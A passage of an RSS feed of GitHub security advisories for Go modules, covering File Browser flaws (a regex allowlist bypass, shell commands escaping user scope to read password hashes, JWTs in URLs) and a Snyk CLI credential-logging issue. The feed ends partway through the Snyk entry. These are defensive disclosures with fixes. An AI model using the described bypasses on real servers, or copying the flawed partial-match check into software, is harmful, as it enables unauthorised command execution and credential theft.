<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2025-06-30T17:48:04.867Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser] File Browser vulnerable to command execution allowlist bypass]]></title>
        <id>https://github.com/advisories/GHSA-w7qc-6grj-w7r8</id>
        <link href="https://github.com/advisories/GHSA-w7qc-6grj-w7r8"/>
        <updated>2025-06-30T17:46:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <em>Command Execution</em> feature of Filebrowser only allows the execution of shell command which have been predefined on a user-specific allowlist. The implementation of this allowlist is erroneous, allowing a user to execute additional commands not permitted.</p>
<h2 id="impact">Impact</h2>
<p>A user can execute more shell commands than they are authorized for. The concrete impact of this vulnerability depends on the commands configured, and the binaries installed on the server or in the container image. Due to the missing separation of <em>scopes</em> on the OS-level, this could give an attacker access to all files managed the application, including the File Browser database.</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>For a user to make use of the command execution feature, two things need to happen in advance:</p>
<ol>
<li>An administrator needs to grant that account the <code>Execute commands</code> permission</li>
<li>The command to be executed needs to be listed in the <code>Commands</code> input field (also done by an administrator)</li>
</ol>
<p>If a user tries to execute a different command, it gets rejected by the application.</p>
<p>The allowlist verification of a command happens in the function <code>CanExecute</code> in the file <code>users/users.go</code>:</p>
<pre><code class="language-go">// CanExecute checks if an user can execute a specific command.
func (u *User) CanExecute(command string) bool {
    if !u.Perm.Execute {
        return false
    }

    for _, cmd := range u.Commands {
        if regexp.MustCompile(cmd).MatchString(command) {
            return true
        }
    }

    return false
}
</code></pre>
<p>This check employs a regular expression which does not test if the command issued (<code>command</code>) is identical to a configured one (<code>cmd</code>, part of the array <code>u.Commands</code>) but rather only if the issued command contains an allowed one.
This has the consequence, that, e.g., if you are only granted access to the <code>ls</code> command, you will also be allowed to execute <code>lsof</code> and <code>lsusb</code>.</p>
<p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Grant a user the <code>Execute commands</code> permission and allow them to use only <code>ls</code> in the <code>Commands</code> field.</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/30b84315-16bd-4b8f-ba30-2a395c89f002"></p>
<p>Afterwards, login as that user, open a command execution window and execute <code>lsof</code> and <code>lsusb</code>.</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/f40baf90-832e-4ced-a596-bc75cf691549"></p>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>The <code>CanExecute</code> function in the <em>Filebrowser</em> source code should be fixed to only allow exact matches of the command specified instead of doing partial matching.
The correctness of this fix should be extensively tested in the application's automated test suite.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-25</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-26</code> Fix released in version 2.33.10</li>
</ul>
<h2 id="references">References</h2>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w7qc-6grj-w7r8">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w7qc-6grj-w7r8</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108">https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/releases/tag/v2.33.10">https://github.com/filebrowser/filebrowser/releases/tag/v2.33.10</a></li>
<li><a href="https://github.com/advisories/GHSA-w7qc-6grj-w7r8">https://github.com/advisories/GHSA-w7qc-6grj-w7r8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7qc-6grj-w7r8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-30T17:46:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser vulnerable to command execution allowlist bypass]]></title>
        <id>https://github.com/advisories/GHSA-w7qc-6grj-w7r8</id>
        <link href="https://github.com/advisories/GHSA-w7qc-6grj-w7r8"/>
        <updated>2025-06-30T17:46:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <em>Command Execution</em> feature of Filebrowser only allows the execution of shell command which have been predefined on a user-specific allowlist. The implementation of this allowlist is erroneous, allowing a user to execute additional commands not permitted.</p>
<h2 id="impact">Impact</h2>
<p>A user can execute more shell commands than they are authorized for. The concrete impact of this vulnerability depends on the commands configured, and the binaries installed on the server or in the container image. Due to the missing separation of <em>scopes</em> on the OS-level, this could give an attacker access to all files managed the application, including the File Browser database.</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>For a user to make use of the command execution feature, two things need to happen in advance:</p>
<ol>
<li>An administrator needs to grant that account the <code>Execute commands</code> permission</li>
<li>The command to be executed needs to be listed in the <code>Commands</code> input field (also done by an administrator)</li>
</ol>
<p>If a user tries to execute a different command, it gets rejected by the application.</p>
<p>The allowlist verification of a command happens in the function <code>CanExecute</code> in the file <code>users/users.go</code>:</p>
<pre><code class="language-go">// CanExecute checks if an user can execute a specific command.
func (u *User) CanExecute(command string) bool {
    if !u.Perm.Execute {
        return false
    }

    for _, cmd := range u.Commands {
        if regexp.MustCompile(cmd).MatchString(command) {
            return true
        }
    }

    return false
}
</code></pre>
<p>This check employs a regular expression which does not test if the command issued (<code>command</code>) is identical to a configured one (<code>cmd</code>, part of the array <code>u.Commands</code>) but rather only if the issued command contains an allowed one.
This has the consequence, that, e.g., if you are only granted access to the <code>ls</code> command, you will also be allowed to execute <code>lsof</code> and <code>lsusb</code>.</p>
<p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Grant a user the <code>Execute commands</code> permission and allow them to use only <code>ls</code> in the <code>Commands</code> field.</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/30b84315-16bd-4b8f-ba30-2a395c89f002"></p>
<p>Afterwards, login as that user, open a command execution window and execute <code>lsof</code> and <code>lsusb</code>.</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/f40baf90-832e-4ced-a596-bc75cf691549"></p>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>The <code>CanExecute</code> function in the <em>Filebrowser</em> source code should be fixed to only allow exact matches of the command specified instead of doing partial matching.
The correctness of this fix should be extensively tested in the application's automated test suite.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-25</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-25</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-26</code> Fix released in version 2.33.10</li>
</ul>
<h2 id="references">References</h2>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w7qc-6grj-w7r8">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w7qc-6grj-w7r8</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108">https://github.com/filebrowser/filebrowser/commit/4d830f707fc4314741fd431e70c2ce50cd5a3108</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/releases/tag/v2.33.10">https://github.com/filebrowser/filebrowser/releases/tag/v2.33.10</a></li>
<li><a href="https://github.com/advisories/GHSA-w7qc-6grj-w7r8">https://github.com/advisories/GHSA-w7qc-6grj-w7r8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7qc-6grj-w7r8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-30T17:46:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser] File Browser: Command Execution not Limited to Scope]]></title>
        <id>https://github.com/advisories/GHSA-hc8f-m8g5-8362</id>
        <link href="https://github.com/advisories/GHSA-hc8f-m8g5-8362"/>
        <updated>2025-06-30T17:44:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the web application, all users have a <em>scope</em> assigned, and they only have access to the files within that <em>scope</em>.
The <em>Command Execution</em> feature of Filebrowser allows the execution of shell commands which are not restricted to the scope, potentially giving an attacker read and write access to all files managed by the server.</p>
<h2 id="impact">Impact</h2>
<p>Shell commands are executed with the <em>uid</em> of the server process without any further restrictions.
This means, that they will have access to at least</p>
<ul>
<li>all files managed by the application from all <em>scopes</em>, even those the user does not have access to in the GUI.</li>
<li>the Filebrowser database file containing the password hashes of all accounts.</li>
</ul>
<p>The concrete impact depends on the commands being granted to the attacker, but due to other vulnerabilities identified ("Bypass Command Execution Allowlist", "Shell Commands Can Spawn Other Commands", "Insecure File Permissions") it is likely, that full read- and write-access will exist.</p>
<p>Read access to the database means, that the attacker is capable of extracting all user password hashes.
This enables an offline dictionary attack on the passwords of all accounts, though the choice of the password hash function (<em>bcrypt</em> with a complexity of 10) gives a strong protection against such attacks.
Write access to the database means that attackers are capable of changing a user's password hash, allowing them to impersonate any user account, including an administrator.</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>Shell commands executed by a user are created as a simple subprocess of the application without any further restrictions.
That means, that they have full access to files accessible by the application.
The <em>scope</em> that is assigned to every account is not considered.</p>
<p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Any exploit highly depends on the commands granted to the attacker.
The following screenshot shows, how all password hashes can be extracted using only the <code>grep</code> command:</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/a6fb98e0-2daa-4e10-8480-7963b3d9b214"></p>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>Until this issue is fixed, we recommend to completely disable <code>Execute commands</code> for all accounts.
Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration.
As a defense-in-depth measure, organizations not requiring command execution should operate the Filebrowser from a <em>distroless</em> container image.</p>
<p>There are two approaches to fixing this issue:</p>
<ol>
<li>Limiting the process when it is started e.g., by using <em>user namespaces</em> with a tool like <em>Bubblewrap</em>. If this path is chosen, it is important to use a method that works both on a bare-metal server and within an unprivileged container.</li>
<li>Re-architecting the command execution feature so that file in the various <em>scopes</em> have a distinct <em>uid</em> as an owner and all shell command are executed under the <em>uid</em> of the user's <em>scope</em>.</li>
</ol>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-26</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-25</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-25</code> A patch version has been pushed to disable the feature for all existent installations, and making it <strong>opt-in</strong>. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on <a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a>.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://sloonz.github.io/posts/sandboxing-1/">Sandboxing Applications with Bubblewrap: Securing a Basic Shell</a></li>
<li><a href="https://github.com/GoogleContainerTools/distroless">"Distroless" Container Images.</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hc8f-m8g5-8362">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hc8f-m8g5-8362</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52904">https://nvd.nist.gov/vuln/detail/CVE-2025-52904</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a></li>
<li><a href="https://github.com/GoogleContainerTools/distroless">https://github.com/GoogleContainerTools/distroless</a></li>
<li><a href="https://sloonz.github.io/posts/sandboxing-1">https://sloonz.github.io/posts/sandboxing-1</a></li>
<li><a href="https://github.com/advisories/GHSA-hc8f-m8g5-8362">https://github.com/advisories/GHSA-hc8f-m8g5-8362</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hc8f-m8g5-8362</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-30T17:44:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser: Command Execution not Limited to Scope]]></title>
        <id>https://github.com/advisories/GHSA-hc8f-m8g5-8362</id>
        <link href="https://github.com/advisories/GHSA-hc8f-m8g5-8362"/>
        <updated>2025-06-30T17:44:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the web application, all users have a <em>scope</em> assigned, and they only have access to the files within that <em>scope</em>.
The <em>Command Execution</em> feature of Filebrowser allows the execution of shell commands which are not restricted to the scope, potentially giving an attacker read and write access to all files managed by the server.</p>
<h2 id="impact">Impact</h2>
<p>Shell commands are executed with the <em>uid</em> of the server process without any further restrictions.
This means, that they will have access to at least</p>
<ul>
<li>all files managed by the application from all <em>scopes</em>, even those the user does not have access to in the GUI.</li>
<li>the Filebrowser database file containing the password hashes of all accounts.</li>
</ul>
<p>The concrete impact depends on the commands being granted to the attacker, but due to other vulnerabilities identified ("Bypass Command Execution Allowlist", "Shell Commands Can Spawn Other Commands", "Insecure File Permissions") it is likely, that full read- and write-access will exist.</p>
<p>Read access to the database means, that the attacker is capable of extracting all user password hashes.
This enables an offline dictionary attack on the passwords of all accounts, though the choice of the password hash function (<em>bcrypt</em> with a complexity of 10) gives a strong protection against such attacks.
Write access to the database means that attackers are capable of changing a user's password hash, allowing them to impersonate any user account, including an administrator.</p>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p>Shell commands executed by a user are created as a simple subprocess of the application without any further restrictions.
That means, that they have full access to files accessible by the application.
The <em>scope</em> that is assigned to every account is not considered.</p>
<p>As a prerequisite, an attacker needs an account with the <code>Execute Commands</code> permission and some permitted commands.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Any exploit highly depends on the commands granted to the attacker.
The following screenshot shows, how all password hashes can be extracted using only the <code>grep</code> command:</p>
<p><img alt="image" src="https://github.com/user-attachments/assets/a6fb98e0-2daa-4e10-8480-7963b3d9b214"></p>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>Until this issue is fixed, we recommend to completely disable <code>Execute commands</code> for all accounts.
Since the command execution is an inherently dangerous feature that is not used by all deployments, it should be possible to completely disable it in the application's configuration.
As a defense-in-depth measure, organizations not requiring command execution should operate the Filebrowser from a <em>distroless</em> container image.</p>
<p>There are two approaches to fixing this issue:</p>
<ol>
<li>Limiting the process when it is started e.g., by using <em>user namespaces</em> with a tool like <em>Bubblewrap</em>. If this path is chosen, it is important to use a method that works both on a bare-metal server and within an unprivileged container.</li>
<li>Re-architecting the command execution feature so that file in the various <em>scopes</em> have a distinct <em>uid</em> as an owner and all shell command are executed under the <em>uid</em> of the user's <em>scope</em>.</li>
</ol>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-26</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-18</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-25</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-25</code> A patch version has been pushed to disable the feature for all existent installations, and making it <strong>opt-in</strong>. A warning has been added to the documentation and is printed on the console if the feature is enabled. Due to the project being in maintenance-only mode, the bug has not been fixed. Fix is tracked on <a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a>.</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://sloonz.github.io/posts/sandboxing-1/">Sandboxing Applications with Bubblewrap: Securing a Basic Shell</a></li>
<li><a href="https://github.com/GoogleContainerTools/distroless">"Distroless" Container Images.</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hc8f-m8g5-8362">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-hc8f-m8g5-8362</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52904">https://nvd.nist.gov/vuln/detail/CVE-2025-52904</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/issues/5199">https://github.com/filebrowser/filebrowser/issues/5199</a></li>
<li><a href="https://github.com/GoogleContainerTools/distroless">https://github.com/GoogleContainerTools/distroless</a></li>
<li><a href="https://sloonz.github.io/posts/sandboxing-1">https://sloonz.github.io/posts/sandboxing-1</a></li>
<li><a href="https://github.com/advisories/GHSA-hc8f-m8g5-8362">https://github.com/advisories/GHSA-hc8f-m8g5-8362</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hc8f-m8g5-8362</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-30T17:44:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser] File Browser allows sensitive data to be transferred in URL]]></title>
        <id>https://github.com/advisories/GHSA-rmwh-g367-mj4x</id>
        <link href="https://github.com/advisories/GHSA-rmwh-g367-mj4x"/>
        <updated>2025-06-30T17:44:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>URLs that are accessed by a user are commonly logged in many locations, both server- and client-side. It is thus good practice to never transmit any secret information as part of a URL. The <em>Filebrowser</em> violates this practice, since access tokens are used as GET parameters.</p>
<h2 id="impact">Impact</h2>
<p>The <em>JSON Web Token (JWT)</em> which is used as a session identifier will get leaked to anyone having access to the URLs accessed by the user. This will give the attacker full access to the user's account and, in consequence, to all sensitive files the user has access to.</p>
<h2 id="description">Description</h2>
<p>Sensitive information in URLs is logged by several components (see the following examples), even if access is protected by TLS.</p>
<ul>
<li>The browser history</li>
<li>The access logs on the affected web server</li>
<li>Proxy servers or reverse proxy servers</li>
<li>Third-party servers via the HTTP referrer header</li>
</ul>
<p>In case attackers can access certain logs, they could read the included sensitive data.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>When a file is downloaded via the web interface, the JWT is part of the URL:</p>
<pre><code class="language-http">GET /api/raw/testdir/testfile.txt?auth=eyJh[...]_r4EQ HTTP/1.1
Host: filebrowser.local:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://filebrowser.local:8080/files/testdir/
Cookie: auth=eyJh[...]_r4EQ
Upgrade-Insecure-Requests: 1
Priority: u=0, i
</code></pre>
<p>This also happens when a new <em>command session</em> is started:</p>
<pre><code class="language-http">GET /api/command/?auth=eyJh[...]YW8BA HTTP/1.1
Host: filebrowser.local:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 13
Origin: http://filebrowser.local:8080
Sec-WebSocket-Key: oqQMrF7R34D3lAkj1+ZHTw==
Connection: keep-alive, Upgrade
Cookie: auth=eyJh[...]YW8BA
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
</code></pre>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>Sensitive data like session tokens or user credentials should be transmitted via HTTP headers or the HTTP body only, never in the URL.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-27</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-29</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-26</code> Fix released in version 2.33.9</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Use of GET Request Method With Sensitive Query Strings</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-rmwh-g367-mj4x">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-rmwh-g367-mj4x</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/d5b39a14fd3fc0d1c364116b41289484df7c27b2">https://github.com/filebrowser/filebrowser/commit/d5b39a14fd3fc0d1c364116b41289484df7c27b2</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/releases/tag/v2.33.9">https://github.com/filebrowser/filebrowser/releases/tag/v2.33.9</a></li>
<li><a href="https://github.com/advisories/GHSA-rmwh-g367-mj4x">https://github.com/advisories/GHSA-rmwh-g367-mj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rmwh-g367-mj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T17:44:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/filebrowser/filebrowser/v2] File Browser allows sensitive data to be transferred in URL]]></title>
        <id>https://github.com/advisories/GHSA-rmwh-g367-mj4x</id>
        <link href="https://github.com/advisories/GHSA-rmwh-g367-mj4x"/>
        <updated>2025-06-30T17:44:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>URLs that are accessed by a user are commonly logged in many locations, both server- and client-side. It is thus good practice to never transmit any secret information as part of a URL. The <em>Filebrowser</em> violates this practice, since access tokens are used as GET parameters.</p>
<h2 id="impact">Impact</h2>
<p>The <em>JSON Web Token (JWT)</em> which is used as a session identifier will get leaked to anyone having access to the URLs accessed by the user. This will give the attacker full access to the user's account and, in consequence, to all sensitive files the user has access to.</p>
<h2 id="description">Description</h2>
<p>Sensitive information in URLs is logged by several components (see the following examples), even if access is protected by TLS.</p>
<ul>
<li>The browser history</li>
<li>The access logs on the affected web server</li>
<li>Proxy servers or reverse proxy servers</li>
<li>Third-party servers via the HTTP referrer header</li>
</ul>
<p>In case attackers can access certain logs, they could read the included sensitive data.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>When a file is downloaded via the web interface, the JWT is part of the URL:</p>
<pre><code class="language-http">GET /api/raw/testdir/testfile.txt?auth=eyJh[...]_r4EQ HTTP/1.1
Host: filebrowser.local:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://filebrowser.local:8080/files/testdir/
Cookie: auth=eyJh[...]_r4EQ
Upgrade-Insecure-Requests: 1
Priority: u=0, i
</code></pre>
<p>This also happens when a new <em>command session</em> is started:</p>
<pre><code class="language-http">GET /api/command/?auth=eyJh[...]YW8BA HTTP/1.1
Host: filebrowser.local:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 13
Origin: http://filebrowser.local:8080
Sec-WebSocket-Key: oqQMrF7R34D3lAkj1+ZHTw==
Connection: keep-alive, Upgrade
Cookie: auth=eyJh[...]YW8BA
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
</code></pre>
<h2 id="recommended-countermeasures">Recommended Countermeasures</h2>
<p>Sensitive data like session tokens or user credentials should be transmitted via HTTP headers or the HTTP body only, never in the URL.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li><code>2025-03-27</code> Identified the vulnerability in version 2.32.0</li>
<li><code>2025-04-11</code> Contacted the project</li>
<li><code>2025-04-29</code> Vulnerability disclosed to the project</li>
<li><code>2025-06-25</code> Uploaded advisories to the project's GitHub repository</li>
<li><code>2025-06-26</code> CVE ID assigned by GitHub</li>
<li><code>2025-06-26</code> Fix released in version 2.33.9</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Use of GET Request Method With Sensitive Query Strings</a></li>
</ul>
<h2 id="credits">Credits</h2>
<ul>
<li>Mathias Tausig (<a href="https://www.sba-research.org/">SBA Research</a>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/filebrowser/filebrowser/security/advisories/GHSA-rmwh-g367-mj4x">https://github.com/filebrowser/filebrowser/security/advisories/GHSA-rmwh-g367-mj4x</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/commit/d5b39a14fd3fc0d1c364116b41289484df7c27b2">https://github.com/filebrowser/filebrowser/commit/d5b39a14fd3fc0d1c364116b41289484df7c27b2</a></li>
<li><a href="https://github.com/filebrowser/filebrowser/releases/tag/v2.33.9">https://github.com/filebrowser/filebrowser/releases/tag/v2.33.9</a></li>
<li><a href="https://github.com/advisories/GHSA-rmwh-g367-mj4x">https://github.com/advisories/GHSA-rmwh-g367-mj4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rmwh-g367-mj4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T17:44:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/snyk/go-application-framework] Snyk CLI Insertion of Sensitive Information into Log File allowed in DEBUG or DEBUG/TRACE mode]]></title>
        <id>https://github.com/advisories/GHSA-6hwc-9h8r-3vmf</id>
        <link href="https://github.com/advisories/GHSA-6hwc-9h8r-3vmf"/>
        <updated>2025-06-30T11:42:50.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package snyk before 1.1297.3 are vulnerable to Insertion of Sensitive Information into Log File through local Snyk CLI debug logs. Container Registry credentials provided via environment variables or command line arguments can be exposed when executing Snyk CLI in DEBUG or DEBUG/TRACE mode.</p>
<p>The issue affects the following Snyk commands:</p>
<ol>
<li><p>When snyk container test or snyk container monitor commands are run against a container registry, with debug mode enabled, the container registry credentials may be written into the local Snyk CLI debug log. This only happens with credentials specified in environment variables (SNYK_REGISTRY_USERNAME and SNYK_REGISTRY_PASSWORD), or in the CLI (--password/-p and  --username/-u).</p>
</li>
<li><p>When snyk auth command is executed with debug mode enabled AND the log level is set to TRACE, the Snyk access / refresh credential tokens used to connect the CLI to Snyk may be written into the local CLI debug logs.</p>
</li>
<li><p>When snyk iac test is executed with a Remote IAC Custom rules bundle, debug mode enabled, AND the log level is set to TRACE, the docker registry token may be written into the local CLI debug logs.</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6624">https://nvd.nist.gov/vuln/detail/CVE-2025-6624</a></li>
<li><a href="https://github.com/snyk/cli/commit/38322f377da7e5f1391e1f641710be50989fa4df">https://github.com/snyk/cli/commit/38322f377da7e5f1391e1f641710be50989fa4df</a></li>
<li><a href="https://github.com/snyk/go-application-framework/commit/ca7ba7d72e68455afb466a7a47bb2c9aece86c18">https://github.com/snyk/go-application-framework/commit/ca7ba7d72e68455afb466a7a47bb2c9aece86c18</a></li>
<li><a href="https://docs.snyk.io/snyk-cli/debugging-the-snyk-cli">https://docs.snyk.io/snyk-cli/debugging-the-snyk-cli</a></li>
<li><a href="https://github.com/snyk/cli/releases/tag/v1.1297.3">https://github.com/snyk/cli/releases/tag/v1.1297.3</a></li>
